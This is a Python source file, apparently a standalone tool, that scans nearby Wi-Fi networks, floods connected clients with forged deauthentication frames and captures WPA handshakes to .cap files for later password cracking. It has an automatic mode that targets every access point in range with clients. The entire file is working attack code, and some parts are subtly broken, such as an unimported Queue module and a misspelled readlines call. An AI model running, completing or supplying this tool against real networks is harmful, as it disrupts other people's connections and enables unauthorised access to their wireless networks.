from scapy.all import *
import subprocess
import os
import sys
import argparse
import threading
import queue
import time
import signal
import curses


global stop_threads
global terminate_program

WEP_FLAG = 0b01000000
DS_FLAG = 0b11
TO_DS = 0b01
FROM_DS = 0b10

# Signal handler for user-interrupt
def handle_signal(signal, frame):
    global stop_threads
    global terminate_program
    terminate_program = True
    stop_threads = True

    # Persistent scan screen
    global scr
    global pad_height
    if scr:

        curses.echo()
        curses.endwin()

        # Store the current contents of pad
        scr_contents = []
        for i in range(0, pad_height):
            scr_contents.append(scr.instr(i, 0))
        print('\n'.join(scr_contents))

    raise KeyboardInterrupt
    sys.exit()

class FError(Exception):
    def __init__(self, error_string):
        global terminate_program
        terminate_program = True
        print("[*] ERROR:  {0}".format(error_string))
        exit()

# Access point object
class AP:
    def __init__(self, bssid):
        self.bssid = bssid
        self.ssid = []
        self.power_db = []
        self.channel = []
        self.enc = []
        self.frames = 1

# Client/station object
class Client:
    def __init__(self, mac):
        self.mac = mac
        self.bssid = []
        self.ssid = []
        self.power_db = []
        self.frames = 1


# Determines the encrytption type of the AP
def determineEncrytion(p):

    enc = []

    if p.subtype != 8:
        return enc

    packet = p
    if packet.haslayer(Dot11Elt):
        packet  = packet[Dot11Elt]
        while isinstance(packet, Dot11Elt):
            if packet.ID == 48:
                enc = "WPA2"
            elif packet.ID == 221 and packet.info.startswith('\x00P\xf2\x01\x01\x00'):
                enc = "WPA"
            packet = packet.payload

    #if hasattr(p, 'cap'):
    #    if "privacy" in p.cap.split("+"):
    #        return "WEP"
    if not enc:
        if (p.FCfield & WEP_FLAG != 0):
            enc = "WEP"
        else:
            enc = "OPN"

    return enc


# Core function for scanning area for access points and clients
def scanAPClients(interface, bssid_filter, essid_filter, ignore_bssid, channel, timeout, scr):

    ap_bssid = []
    cl_mac = []

    access_points = []
    clients = []
    global curr_time
    global channel_time
    global set_channel
    curr_time = time.process_time()
    if channel:
        setInterfaceChannel(interface, channel)
        set_channel = []
    else:
        set_channel = 1
    channel_time = time.process_time()

    def filterPackets(p):


        global terminate_program
        if terminate_program:
            raise KeyboardInterrupt

        # Update channel every 0.5s
        global channel_time
        global set_channel
        if set_channel:
            if (time.process_time() - channel_time) > 0.05:
                channel_time = time.process_time()
                set_channel = (set_channel+1)%14
                if set_channel == 0:
                    set_channel =1
                setInterfaceChannel(interface, set_channel)


        # print '.' to show scanning
        if not scr:
            global curr_time
            if (time.process_time()-curr_time) > 0.1:
                sys.stdout.write('.')
                sys.stdout.flush()
                curr_time = time.process_time()


        DS = p.FCfield & DS_FLAG
        to_ds = p.FCfield & TO_DS != 0
        from_ds = p.FCfield & FROM_DS != 0


        if not to_ds and not from_ds :
            dst_addr = p.addr1
            src_addr = p.addr2
            bss_addr = p.addr3
        elif not to_ds and from_ds:
            dst_addr = p.addr1
            src_addr = p.addr3
            bss_addr = p.addr2
        elif to_ds and not from_ds:
            dst_addr = p.addr3
            src_addr = p.addr2
            bss_addr = p.addr1
        else:
            return

        # Filter/ignore
        if ignore_bssid and bss_addr:
            if bss_addr in ignore_bssid:
                return
        if bssid_filter and bss_addr:
            if bss_addr not in bssid_filter:
                return
        if essid_filter:
            try:
                if p.info not in essid_filter:
                    return
            except:
                return


        if bss_addr not in (None, "ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"):
            if bss_addr not in ap_bssid:
                ap_bssid.append(bss_addr)
                access_points.append(AP(bss_addr))
                access_points[-1].power_db = -(256-ord(p.notdecoded[-4:-3]))
                try: access_points[-1].channel = int(ord(p[Dot11Elt:3].info))
                except: pass
                try: access_points[-1].ssid = str(p.info)
                except: pass
                access_points[-1].enc = determineEncrytion(p)
            else: # Update ap info
                for ap in access_points:
                    if ap.bssid == bss_addr:
                        ap.power_db = (ap.power_db-(256-ord(p.notdecoded[-4:-3])))/2
                        if not ap.enc:
                            ap.enc = determineEncrytion(p)
                        if not ap.ssid:
                            try: ap.ssid = p.info
                            except: pass
                        if not ap.channel:
                            try: ap.channel = int(ord(p[Dot11Elt:3].info))
                            except: pass
                        ap.frames = ap.frames+1
                        break
            # Update screen
            if scr:
                for ap in access_points:
                    if ap.bssid == bss_addr:
                        updateCursesScreen(scr, ap)
                        break


        addr = [ad for ad in (dst_addr, src_addr) if ad not in (None, bss_addr, "ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00")]
        for ad in addr:
            if ad not in cl_mac:
                cl_mac.append(ad)
                clients.append(Client(ad))
                clients[-1].power_db = -(256-ord(p.notdecoded[-4:-3]))
                try: clients[-1].ssid = p.info
                except: pass
                if bss_addr not in (None, "ff:ff:ff:ff:ff:ff"):
                    clients[-1].bssid = bss_addr
            else: # Update signal power, # of frames
                for cl in clients:
                    if cl.mac == ad:
                        cl.power_db = (cl.power_db-(256-ord(p.notdecoded[-4:-3])))/2
                        cl.frames = cl.frames+1
                        if not cl.ssid:
                            try: cl.ssid = p.info
                            except: pass
                        break



    def __sniff(interface, filter, timeout):

        try:
            sniff(iface=interface, store=0, prn=filter, timeout=timeout)
        except KeyboardInterrupt:
            exit()
        except:
            if not scr:
                sys.stdout.write("\n[*] Scan failed trying again, ensure wifi card is capable of injection")
            time.sleep(2)
            __sniff(interface, filter, timeout)

    if not scr:
        sys.stdout.write("[*] Scanning " + str(timeout) + "s ")
        sys.stdout.flush()
    __sniff(interface, filterPackets, timeout)
    if not scr:
        sys.stdout.write('\n')

    return access_points, clients


# Places interface in monitor mode
global ip_iw
global ifconfig_iwconfig
def interfaceMonitorMode(interface):

    global ip_iw
    global ifconfig_iwconfig
    ip_iw = False
    ifconfig_iwconfig = False
    if_command = []
    iw_command = []
    mode_check = []

    # determine if ifconfig, iwconfig or ip,iw is installed
    for path in os.environ["PATH"].split(os.pathsep):
            ifpath = os.path.join(path, "ifconfig")
            iwpath = os.path.join(path, "iwconfig")
            if os.path.isfile(ifpath):
                if_command = "ifconfig {0} ".format(interface)
            if os.path.isfile(iwpath):
                iw_command = "iwconfig {0} mode monitor".format(interface)
                mode_check = "iwconfig {0}".format(interface)
            ifconfig_iwconfig = True

    if not if_command or not iw_command:
        for path in os.environ["PATH"].split(os.pathsep):
            ifpath = os.path.join(path, "ip")
            iwpath = os.path.join(path, "iw")
            if os.path.isfile(ifpath):
                if_command = "ip link set dev {0} ".format(interface)
            if os.path.isfile(iwpath):
                iw_command = "iw {0} set monitor control".format(interface)
                mode_check = "iw dev {0} info".format(interface)
            ip_iw = True

    if not if_command or not iw_command:
        raise FError("Install either \'ifconfig\',\'iwconfig\' or \'ip\',\'iw\'")
        exit()


    # check if already in monitor mode
    s = subprocess.Popen(mode_check, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, err = s.communicate()
    if err: raise FError("No interface \'" + interface + "\' found")
    if "monitor" in str(output.lower()):
        print("[*] Interface \'" + interface + "\' in monitor mode")
        return

    # needed to ditch output
    global devnull

    # bring interface down
    s = subprocess.Popen([if_command + " down"], shell=True, stdout=devnull, stderr=subprocess.PIPE)
    output, err = s.communicate()
    if err: raise FError("Bringing interface down")

    # place into monitor mode
    s = subprocess.Popen(iw_command, shell=True, stdout=devnull, stderr=subprocess.PIPE)
    output, err = s.communicate()
    if err: raise FError("Placing interface in monitor mode")

    # bring interface back up
    s = subprocess.Popen([if_command + " up"], shell=True, stdout=devnull, stderr=subprocess.PIPE)
    output, err = s.communicate()
    if err: raise FError("Bringing interface back up")

    print("[*] Interface \'" + interface + "\' in monitor mode")
    return


# Sets the frequency channel of the wireless interface
def setInterfaceChannel(interface, channel):

    global ip_iw
    global ifconfig_iwconfig
    global devnull

    if ifconfig_iwconfig:
        s = subprocess.Popen(["iwconfig " + interface + " channel " + str(channel)], shell=True, stdout=devnull, stderr=subprocess.PIPE)
        output, err = s.communicate()
        if err: raise FError("Changing channel on interface")

    elif ip_iw:
        s = subprocess.Popen(["iw dev " + interface + " set channel " + str(channel)], shell=True, stdout=devnull, stderr=subprocess.PIPE)
        output, err = s.communicate()
        if err: raise FError("Changing channel on interface")



# Thread for sniffing WPA handshake for specified access point
def sniffAPThread(interface, bssid, channel, waittime, que):

    to_frames = []
    from_frames = []
    clients = []
    setInterfaceChannel(interface, channel)
    global captured_handshake
    captured_handshake = False

    def checkForWPAHandshake(p):

        global stop_threads
        global terminate_program
        if terminate_program:
            raise KeyboardInterrupt
        if stop_threads:
            return True

        if EAPOL in p:

            DS = p.FCfield & DS_FLAG
            to_ds = p.FCfield & TO_DS != 0

            if to_ds:
                client = p.addr2
            else:
                client = p.addr1

            if client not in clients:
                clients.append(client)
                to_frames.append(0)
                from_frames.append(0)


            idx = clients.index(client)
            if to_ds:
                to_frames[idx] = to_frames[idx] + 1
            else:
                from_frames[idx] = from_frames[idx] + 1

            # See if we captured 4 way handshake
            if (to_frames[idx] >= 2) and (from_frames[idx] >=2):
                global captured_handshake
                captured_handshake = True
                return True

            return False

        else:
            return False

    def __sniff(interface, filter, stop_filter, timeout):

        try:
            cap = sniff(iface=interface, filter=f, stop_filter=checkForWPAHandshake, timeout=timeout)
            return cap
        except KeyboardInterrupt:
            sys.exit()
        except:
            sys.stdout.write("\n[*] WPA scan failed trying again")
            time.sleep(1)
            __sniff(interface, filter, stop_filter, timeout)

    f = "ether host " + bssid
    cap = __sniff(interface, f, checkForWPAHandshake, waittime)
    que.put(captured_handshake)
    if captured_handshake:
        que.put(cap)
    else:
        del cap


# Capture WPA handshake from specific target
def scanModeCapture(interface, bssid_filter, essid_filter, ignore_bssid,  channel, scantime, waittime, output_file):

    ssid = []
    bssid = []
    while True:

        # scan area for AP and clients
        access_points, clients = scanAPClients(interface, bssid_filter, essid_filter, ignore_bssid,  channel, scantime, [])
        if terminate_program:
            exit()

        if not access_points:
            if bssid_filter:
                print("[*] Access point \'" + bssid_filter + "\' not found during scan")
                continue
            if essid_filter:
                print("[*] Access point \'" + essid_filter + "\' not found during scan")
                continue

        if not bssid_filter:
            for ap in access_points:
                if ap.ssid == essid_filter:
                    bssid = ap.bssid
                    bssid_filter = ap.bssid
                    break
        else:
            bssid = bssid_filter

        if not channel:
            for ap in access_points:
                if ap.bssid == bssid_filter:
                    if ap.channel:
                        channel = ap.channel
                        break
                    else:
                        continue

        if not essid_filter:
            for ap in access_points:
                if ap.bssid == bssid_filter:
                    if ap.ssid:
                        ssid = ap.ssid
        else:
            ssid = essid_filter

        conn_clients = []
        for cl in clients:
            if cl.bssid:
                for ap in access_points:
                    if ap.bssid == cl.bssid:
                        conn_clients.append(cl.mac)
        conn_clients.append("ff:ff:ff:ff:ff:ff")

        conn_clients = set(conn_clients)
        if len(conn_clients) == 1:
            print("[*] No clients found connected to access point, trying broadcast address")

        # Begin deauth threads and for sniffing handshake
        if ssid:
            sys.stdout.write("[*] deauthing " + str(len(conn_clients)) + " clients on " + ssid  + " (channel " + str(channel) + ")")
        else:
            sys.stdout.write("[*] deauthing " + str(len(conn_clients)) + " clients on " + bssid  + " (channel " + str(channel) + ")")
        sys.stdout.flush()

        q = Queue.Queue()
        stop_threads = False
        st = threading.Thread(target=sniffAPThread, args=[interface, bssid, channel, waittime, q])
        dt = threading.Thread(target=deauthClientThread, args=[bssid, conn_clients, deauth_count])
        st.start()
        dt.start()
        while st.isAlive():
            time.sleep(1)
        #st.join()
        stop_threads = True
        sys.stdout.write('\n')
        sys.stdout.flush()
        if q.get():
            print("[+] Captured WPA handshake! ")
            cap = q.get()
            if os.path.isdir(output_file):
                if ssid:
                    wrpcap(output_file + ssid  + ".cap", cap)
                else:
                    wrpcap(output_file + bssid + ".cap", cap)
            else:
                wrpcap(output_file, cap)
            exit()
        else:
            print("[-] Handshake capture failed ")

        del access_points
        del clients
        del q



# Sends deauthentication packets to clients
def deauthClientThread(bssid, clients, count):
    global stop_threads
    global terminate_program
    for client in clients:
        sys.stdout.write('.')
        sys.stdout.flush()
        pkt=scapy.all.RadioTap()/scapy.all.Dot11(addr1=client,addr2=bssid,addr3=bssid)/scapy.all.Dot11Deauth()
        for i in range(count):
            if stop_threads:
                return
            if terminate_program:
                exit()
            try:
                scapy.all.sendp(pkt, iface=interface, count=1, verbose=0)#inter=.2
            except:
                pass
            time.sleep(0.2)
        # sleep for a bit inbetween switching clients
        for i in range(10):
            time.sleep(0.5)
            if stop_threads:
                return
            if terminate_program:
                exit()


# Will automatically scan for AP's and try and capture WPA handshakes
def scanModeAuto(interface, bssid_filter, essid_filter, ignore_bssid, channel, scantime, waittime, output_folder):

    # Keep working until user stops
    global stop_threads
    while True:

        # scan area for AP and clients
        access_points, clients = scanAPClients(interface, bssid_filter, essid_filter, ignore_bssid,  channel, scantime, [])
        if terminate_program:
            exit()

        if not access_points:
            print("[*] No access points found during scan")
            continue
        if not clients:
            print("[*] No clients found during scan")
            continue

        # get clients associated with ap's
        mac = []
        bssid = []
        ssid = []
        frames = []
        channel = []
        for cl in clients:
            if cl.bssid:
                for ap in access_points:
                    if ap.bssid == cl.bssid:

                        # Do some filtering
                        if ap.bssid in ignore_bssid:
                            continue
                        if not ap.channel:
                            continue
                        if ap.frames < 5:
                            continue

                        mac.append(cl.mac)
                        bssid.append(cl.bssid)
                        channel.append(ap.channel)
                        if ap.ssid:
                            ssid.append(ap.ssid)
                        else:
                            ssid.append("Unknown("+cl.bssid+")")
                        frames.append(cl.frames)
                        break


        # get unique ap's
        unique_bssid = set(bssid)
        unique_ssid = []
        unique_channel = []
        total_frames = [0]*len(unique_bssid)

        for ubs in unique_bssid:
            for idx,bs in enumerate(bssid):
                if bs == ubs:
                    unique_ssid.append(ssid[idx])
                    unique_channel.append(channel[idx])
                    break



        # get total client frames for each ap
        for idx,ubs in enumerate(unique_bssid):
            for idx2,bs in enumerate(bssid):
                if bs == ubs:
                    total_frames[idx] = total_frames[idx] + frames[idx2]


        # sort by frame number
        unique_bssid = [y for x,y in sorted(zip(total_frames, unique_bssid), reverse=True)]
        unique_ssid = [y for x,y in sorted(zip(total_frames, unique_ssid), reverse=True)]
        total_frames.sort(reverse=True)



        # Build list of clients for each AP
        ap_clients = []
        for bs in unique_bssid:
            idx = [idx for idx, b in enumerate(bssid) if b == bs]
            f = [f for i, f in enumerate(frames) if i in idx]
            cl = [cl for i, cl in enumerate(mac) if i in idx]
            cl = [y for x,y in sorted(zip(f,cl), reverse=True)]
            cl.append("ff:ff:ff:ff:ff:ff") # append broadcast
            ap_clients.append(cl)



        q = Queue.Queue()
        print("[*] Found " + str(len(unique_bssid)) + " access points with connected clients")
        for idx,bs in enumerate(unique_bssid):
            sys.stdout.write("[*] deauthing " + str(len(ap_clients[idx])) + " clients on " + unique_ssid[idx] + " (channel " + str(channel[idx]) + ")")
            sys.stdout.flush()

            # Begin deauth threads and for sniffing handshake
            stop_threads = False
            st = threading.Thread(target=sniffAPThread, args=[interface, bs, channel[idx], waittime, q])
            dt = threading.Thread(target=deauthClientThread, args=[bs, ap_clients[idx], deauth_count])
            st.start()
            dt.start()
            while st.isAlive():
                time.sleep(1)
            #st.join()
            stop_threads = True
            sys.stdout.write('\n')
            sys.stdout.flush()
            if q.get():
                print("[+] captured wpa handshake! (" + unique_ssid[idx] + ", " + bs + ")")
                cap = q.get()
                wrpcap(output_folder + unique_ssid[idx] + ".cap", cap)
                del cap
                # captured handshake now ignore AP
                ignore_bssid.append(bs)
            else:
                print("[-] handshake capture failed (" + unique_ssid[idx] + ", " + bs + ")")

        del q
        del access_points
        del clients



def initializeCursesScreen():

    global row_format
    global pad_pos
    global pad_height
    global pad_width
    global curses_ap
    global ap_row
    curses_ap = []
    ap_row = []
    stdscr = curses.initscr()
    curses.noecho()
    pad_height, pad_width = stdscr.getmaxyx()

    # Create a curses pad (pad size is height + 10)
    mypad = curses.newpad(pad_height+10, pad_width);
    #mypad.scrollok(True)
    pad_pos = 0
    mypad.refresh(pad_pos, 0, 0, 0, pad_height-1, pad_width)

    header = ["BSSID", "SSID", "CHANNEL", "POWER", "ENC", "# FRAMES"]
    row_format ="{:>20}" * (len(header) + 1)
    mypad.addstr(5, 0, row_format.format("", *header), curses.A_BOLD)
    mypad.refresh(pad_pos, 0, 0, 0, pad_height-1, pad_width)

    return mypad
    time.sleep(5)
    curses.noecho()
    curses.endwin()


def updateCursesScreen(scr, AP):
    global row_format
    global pad_pos
    global pad_height
    global pad_width
    global curses_ap
    global ap_row

    if AP.bssid is None:
        return

    # Update row
    for idx,ap in enumerate(curses_ap):
        if ap.bssid == AP.bssid:
            if len(AP.ssid) > 16:
                ssid = AP.ssid[0:16] + "..."
            else:
                ssid = AP.ssid
            row_data = [AP.bssid, ssid, AP.channel, AP.power_db, AP.enc, AP.frames]
            try:
                scr.addstr(ap_row[idx], 0, row_format.format("", *row_data))
            except:
                pass
            scr.refresh(pad_pos, 0, 0, 0, pad_height-1, pad_width)
            return

    # Add row if new AP
    curses_ap.append(AP)
    ap_row.append(len(ap_row)+6)
    if len(AP.ssid) > 16:
        ssid = AP.ssid[0:16] + "..."
    else:
        ssid = AP.ssid
    row_data = [AP.bssid, ssid, AP.channel, AP.power_db, AP.enc, AP.frames]
    try:
        scr.addstr(ap_row[-1], 0, row_format.format("", *row_data))
    except:
        pass


    return



# Main function
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("interface", help="wifi interface capable of monitor mode")
    parser.add_argument("-b", dest="bssid_filter", help="bssid to filter for or file containing bssid to filter for (one per line)")
    parser.add_argument("-e", dest="essid_filter", help="essid to filter for or file containing essid to filter for (one per line)")
    parser.add_argument("-c", dest="channel", help="specify channel", type=int)
    parser.add_argument("-i", dest="ignore_bssid", help="bssid to ignore, or file containing list of bssids (one per line)")
    parser.add_argument("-t", dest="scantime", help="length of scan time (default 10s)", type=int)
    parser.add_argument("-w", dest="waittime", help="time to wait for WPA handshake after deauth (defaults: capturemode 90s, automode 30s)", type=int)
    parser.add_argument("-d", dest="deauth_count", help="number of deauth frames to send (default 10)", type=int)
    parser.add_argument("-A", dest="automode", action="store_true", help="auto find AP, de-auth, capture handshakes")
    parser.add_argument("-S", dest="scanmode", action="store_true", help="scan and display AP's")
    parser.add_argument("-C", dest="capturemode", action="store_true", help="capture handshake for specified AP")
    parser.add_argument("-o", dest="output_file", help="location to output .cap file (capture mode)")
    parser.add_argument("-O", dest="output_folder", help="output folder for storing cap files (auto mode)")
    args = parser.parse_args()


    if os.getuid() != 0:
        print("[*] must run as root!")
        exit()


    # setup signal handler
    global stop_threads
    global terminate_program
    global scr
    scr = []
    stop_threads = False
    terminate_program = False
    signal.signal(signal.SIGINT, handle_signal)

    # open /dev/null to ditch stdout, stderr
    global devnull
    try:
        devnull = open(os.devnull, 'w')
    except:
        raise FError("Error opening /dev/null, something seriously wrong")

    # Retrieve arguments
    interface = args.interface

    # BSSID's to filter for
    if args.bssid_filter:
        if os.path.isfile(args.bssid_filter):
            try:
                f = open(args.bssid_filter, 'r')
            except:
                FError("Cannot open file \'" + args.bssid_filter + "\'")

            bssid_filter = []
            for line in f.readlines():
                bssid_filter.append(line.lower().strip())
        elif os.path.isfile(os.getcwd() + '/' + args.bssid_filter):
                try:
                    f = open(os.getcwd() + '/' + args.bssid_filter, 'r')
                except:
                    FError("Cannot open file \'" + args.bssid_filter + "\'")

                bssid_filter = []
                for line in f.readlines():
                    bssid_filter.append(line.lower().strip())

        else:
            bssid_filter = args.bssid_filter
    else:
        bssid_filter = []


    # ESSID's to filter for
    if args.essid_filter:
        if os.path.isfile(args.essid_filter):
            try:
                f = open(args.essid_filter, 'r')
            except:
                FError("Cannot open file \'" + args.essid_filter + "\'")

            essid_filter = []
            for line in f.readlines():
                essid_filter.append(line.strip())
        elif os.path.isfile(os.getcwd() + '/' + args.essid_filter):
            try:
                f = open(os.getcwd() + '/' + args.essid_filter, 'r')
            except:
                FError("Cannot open file \'" + args.essid_filter + "\'")

            essid_filter = []
            for line in f.readlines():
                essid_filter.append(line.strip())

        else:
            essid_filter = args.essid_filter
    else:
        essid_filter = []


    # Channel
    if args.channel:
        channel = args.channel
    else:
        channel = []


    # BSSID's to ignore:
    if args.ignore_bssid:
        if os.path.isfile(args.ignore_bssid):
            try:
                f = open(args.ignore_bssid, 'r')
            except:
                FError("Cannot open file \'" + args.ignore_bssid + "\'")

            ignore_bssid = []
            for line in f.readolines():
                ignore_bssid.append(line.lower().strip())
        else:
            ignore_bssid = args.ignore_bssid
    else:
        ignore_bssid = []

    # Deauthentication packet count
    if args.deauth_count:
        deauth_count = args.deauth_count
        if deauth_count < 1:
            deauth_count = 10
    else:
        deauth_count = 10

    # Mode
    if args.automode:
        automode = args.automode
    else:
        automode = False
    if args.scanmode:
        scanmode = args.scanmode
    else:
        scanmode = False
    if args.capturemode:
        capturemode = args.capturemode
    else:
        capturemode = False

    # wait time
    if args.waittime:
        waittime = args.waittime
    elif automode:
        waittime = 30
    elif capturemode:
        waittime = 90

    # Scan time
    if args.scantime:
        scantime = args.scantime
    elif automode:
        scantime = 15
    elif capturemode:
        scantime = 30

    mode = sum([automode, scanmode, capturemode])
    if mode > 1:
        FError("Only choose one mode (-a, -s, -m)")
    elif mode < 1:
        FError("Choose a scan mode mode (-a, -s, -m)")

    # Determine output folder for automode
    if automode:
        if args.output_folder:
            output_folder = args.output_folder
            if not os.path.isdir(output_folder):
                FError("\'" + output_folder + "\' directory does not exist")
        else:
            output_folder = os.getcwd()
        output_folder = output_folder + '/'


    # Determine output file for single capture mode
    if capturemode:
        if args.output_file:
            output_file = args.output_file
            dir = output_file.rsplit('/',1)
            if len(dir)>1:
                if not os.path.isdir(dir[0]):
                    FError("\'" + dir[0] + "\' directory does not exist")
            else:
                output_file = os.getcwd() + "/" + output_file
            if ".cap" not in output_file:
                output_file = output_file + ".cap"
        else:
            output_file = os.getcwd() + '/'
        if not bssid_filter and not essid_filter:
            FError("Specify BSSID or SSID to capture handshake from (-b, -e)")
        if bssid_filter and essid_filter:
            FError("Only specify BSSID or SSID in capture mode, not both")
        if bssid_filter:
            if not isinstance(bssid_filter, str):
                FError("Only specify 1 BSSID for capture mode (use auto-mode for more)")
        if essid_filter:
            if not isinstance(essid_filter, str):
                FError("Only specify 1 SSID for capture mode (use auto-mode for more)")



    # Place interface into monitor mode
    interfaceMonitorMode(interface)



    if scanmode:
        scr = initializeCursesScreen()
        access_points, clients = scanAPClients(interface, bssid_filter, essid_filter, ignore_bssid,  channel, None, scr)

    if capturemode:
        scanModeCapture(interface, bssid_filter, essid_filter, ignore_bssid,  channel, scantime, waittime, output_file)

    if automode:
        scanModeAuto(interface, bssid_filter, essid_filter, ignore_bssid,  channel, scantime, waittime, output_folder)
